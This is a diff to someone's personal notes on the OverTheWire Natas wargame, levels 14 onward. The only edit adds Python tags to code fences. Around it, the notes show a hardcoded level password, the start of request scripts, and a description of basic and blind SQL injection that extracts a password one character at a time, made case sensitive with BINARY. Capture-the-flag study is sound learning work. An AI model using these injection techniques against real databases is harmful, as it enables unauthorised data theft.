@@ -6,7 +6,7 @@ Source:  #natas #web #py
 Tags: [[Injection]]
 ## Natas 14  ->  Basic SQL injection 
 
-```
+```python
 import requests
 username = 'natas14'
 password = 'z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ'
@@ -32,7 +32,7 @@ injecting the following in the username will give the pass
 - putting `BINARY` right before the field in the Select statement we'll make that field case sensitive
 - we loop through all the characters for every position of the password [[BlindSQL]]
 
-```
+```python
 import requests
 import string
 characters = string.ascii_letters + "0123456789"  
